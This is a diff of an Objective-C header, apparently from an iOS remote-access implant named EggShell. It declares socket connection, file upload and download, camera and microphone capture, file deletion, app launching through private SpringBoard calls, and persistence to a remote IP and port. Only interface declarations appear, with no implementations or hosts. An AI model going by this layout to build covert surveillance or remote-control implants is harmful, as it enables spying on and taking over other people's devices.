@@ -24,9 +24,9 @@
 @property (nonatomic,retain) NSTimer *timer;
 //socks
 extern int sockfd;
--(int)connect:(NSString*)host
-             :(long)port;
--(void)sendData:(NSData *)data;
+-(int)connect:(NSString*)host :(long)port;
+-(void)receiveFileData:(NSString *)saveToPath :(long)fileSize;
+-(void)sendFileData:(NSData*)fileData;
 -(void)sendString:(NSString *)string;
 
 //convenience
@@ -34,7 +34,7 @@ extern int sockfd;
 -(void)blank;
 
 //camera
--(void)camera:(BOOL)isfront;
+-(NSData*)camera:(BOOL)isfront;
 -(AVCaptureDevice *)frontFacingCameraIfAvailable;
 -(AVCaptureDevice *)backFacingCameraIfAvailable;
 -(void)setupCaptureSession:(BOOL)isfront;
@@ -42,14 +42,13 @@ extern int sockfd;
 
 //mic
 -(void)mic:(NSString *)arg;
+
 //file management
 -(void)directoryList:(NSString *)arg;
 -(void)rmFile:(NSString *)arg;
 -(void)changeWD:(NSString *)arg;
 -(void)sendEncryptedFile:(NSData *)fileData;
--(void)download:(NSString *)arg;
-//-(void)encryptFile:(NSString *)arg;
-//-(void)decryptFile:(NSString *)arg;
+-(NSData*)filePathToData:(NSString *)arg;
 
 //misc
 extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean suspended);
@@ -72,6 +71,7 @@ extern CFStringRef SBSApplicationLaunchingErrorString(int error);
 -(void)launchApp:(NSString *)arg;
 -(void)persistence:(NSString *)ip :(int)port;
 -(void)rmpersistence;
+-(void)eslog:(NSString *)str;
 
 //eggshell pro
 -(void)upload:(NSString *)uploadpath;
